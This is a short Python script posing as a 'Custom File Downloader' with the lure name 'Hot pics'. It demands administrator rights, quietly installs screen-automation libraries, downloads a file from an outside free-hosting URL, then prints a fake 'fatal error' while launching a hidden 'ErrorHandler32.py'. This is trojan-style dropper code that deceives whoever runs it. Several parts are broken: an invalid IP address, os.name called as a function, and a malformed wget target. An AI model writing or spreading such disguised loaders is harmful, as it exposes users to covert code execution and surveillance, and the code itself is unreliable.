import os, subprocess, ctypes
#Custom File Downloader
#By Ethan Hunt

#Release date: 11/9/23

server='127.129.289.92' #Replace this with the download server
name='Hot pics' #Replace this with the name of the file or folder to be downloaded

print("Initializing...")

def is_admin():
    try:
        return os.getuid()==0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin()!=0

if not is_admin():
    exit('Please run the program as administrator to start the download.')

print("File", name, "set to be downloaded now. Starting download...")

try:
    import pyautogui
except ImportError:
    os.system('pip install pyautogui')
try:
    import PIL
except ImportError:
    os.system('pip install Pillow')

if os.name()=='nt':
    os.system('Invoke-WebRequest -Uri https://skimonco.000webhostapp.com/Beans.jpg -Outfile C:\\Beans.jpg ')
else:
    if os.system('wget --version')!=0:
        os.system('sudo apt install wget -y')
    os.system('wget https://skimonco.000webhostapp.com/Beans.jpg -O /home')

pwd=subprocess.getoutput('pwd')

if os.name=='nt':
    prefix='\\'
else:
    prefix='/'

launch=pwd+prefix+'ErrorHandler32.py'

subprocess.Popen(['python3', launch])

exit("A fatal error has occured. Launching error handler.")